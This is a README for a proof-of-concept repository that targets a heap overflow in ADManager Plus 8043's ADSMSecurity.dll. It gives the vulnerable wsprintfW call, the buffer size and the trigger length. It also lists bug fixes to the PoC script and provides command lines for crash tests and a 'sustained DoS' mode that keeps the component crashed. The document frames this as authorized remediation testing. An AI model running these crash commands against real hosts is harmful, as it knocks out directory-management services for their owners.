# F4 Crash PoC - ADManager Plus 8043 / ADSMSecurity.dll - Fixed

## Overview
This repository contains the **fixed and runnable** version of the F4 heap-overflow Proof-of-Concept originally reported against `ADSMSecurity.dll` (`sub_0x7410`).

### Vulnerability
```c
wsprintfW( malloc(0x208), "%s\\*.*", path )   at sub_0x7410+0x74a4
```
- Buffer: 0x208 bytes = 520 bytes = 260 wide chars
- Input: caller-controlled path length
- Overflow when `len(path) >= 256` (writes `len+5` wchars)
- Result: `STATUS_HEAP_CORRUPTION 0xC0000374` - Windows heap manager terminates the process

### Safety
- Path fed is **NON-EXISTENT** (`C:\AAA...`), so file-deletion branch is unreachable
- Test runs in a throwaway child process - only that process dies
- No disk, service, or data is touched
- Demonstrates DoS class bug, **NOT RCE**

## Fixes Applied (Original Code Was Broken)

Original pasted code had these critical errors:

1. **Duplicate `main()` definitions** - Two `def main():` blocks, first one incomplete:
   ```python
   def main():
           description="F4 crash PoC..."  # missing argparse.ArgumentParser(
   ```
   Fixed: single clean `main()` with proper `argparse.ArgumentParser(...)`

2. **Missing `%` escaping** in sustain banner:
   ```python
   print('  wsprintfW( malloc(0x208), "%s\\*.*", path )  with  len(path) = %d' % length)
   # "%s" inside string breaks % formatting -> TypeError
   ```
   Fixed: `%%s` escaping

3. **POSIX exit-code truncation** - On Linux/macOS, exit codes are 0-255, so Windows NTSTATUS `0xC0000417` becomes `23` (`0x17`). Original crash detection `rc in (0xC0000374,...)` never matched on Linux, reporting "No corruption".
   Fixed: added `CRASH_EXIT_CODES` set with truncated equivalents (116, 5, 23, 9) and `is_crash_code()` helper that checks both full and low-byte.

4. **No cross-platform guard** - `os.add_dll_directory`, `ctypes.WinDLL`, `WINFUNCTYPE` crash on Linux, and `os.path.isfile(DLL)` caused hard exit `2` preventing any run.
   Fixed: `is_windows()` detection, `SIMULATION_MODE`, graceful fallback, `try/except` around Windows-only APIs, simulation worker for CI.

5. **Unsafe temp folder handling** - control mode assumed `TEMP` env and didn't cleanup.
   Fixed: `tempfile.gettempdir()` fallback, `shutil.rmtree` cleanup, empty check.

6. **Added robust simulation** for non-Windows hosts:
   - len <256 => no crash (intact)
   - len >=256 => HeapValidate damaged, exit 23/116 simulating `0xC0000417`/`0xC0000374`
   - Allows `python f4_crash_poc.py --help` and all modes to run definitively anywhere.

## Usage

### On Windows (Authorized, with real DLL)
PowerShell as Administrator on ADManager Plus host:

```powershell
# Control - no overflow
python f4_crash_poc.py --control

# No overflow (100 chars)
python f4_crash_poc.py --len 100

# Overflow - should crash child with 0xC0000374 / 0xC0000417
python f4_crash_poc.py --len 1000
python f4_crash_poc.py --len 300
python f4_crash_poc.py --len 1000 --attempts 5

# Sustained DoS demonstration (keeps component crashed)
python f4_crash_poc.py --sustain --len 1000 --duration 60
python f4_crash_poc.py --sustain --len 1000   # until Ctrl+C
```

### On Linux / macOS / CI (Simulation Mode)
Same commands work in simulation, no DLL needed:

```bash
python3 f4_crash_poc.py --control
python3 f4_crash_poc.py --len 100      # no crash
python3 f4_crash_poc.py --len 1000     # simulated crash -> F4 CONFIRMED
python3 f4_crash_poc.py --len 300 --attempts 3
python3 f4_crash_poc.py --sustain --len 1000 --duration 5
```

Expected outputs:
- `--control` / `--len 100`: `0 crashes`, `no crash - process returned normally`
- `--len 1000`: `F4 CONFIRMED: 1/1 runs ... ended in heap corruption`
- `--sustain`: live counter, `100% crashes`

## Project Structure
```
.
├── f4_crash_poc.py                    # Fixed main PoC (runnable everywhere)
├── WALKER_HEAP_OVERFLOW_RECIPE.md     # Detailed vulnerability analysis (placeholder)
├── README.md                          # This file
├── FIXES.md                           # Detailed bugfix log
├── requirements.txt                   # No external deps (stdlib only)
└── .gitignore
```

## Requirements
- Python 3.8+ (stdlib only, no pip deps)
- Windows + `ADSMSecurity.dll` for real test
- Linux/macOS works in simulation mode for testing

## Legal / Ethics
- Authorized local testing only
- Do not run against systems you do not own
- This is a DoS demonstration; RCE not demonstrated and out of scope

## License
For authorized security research / audit remediation verification only.
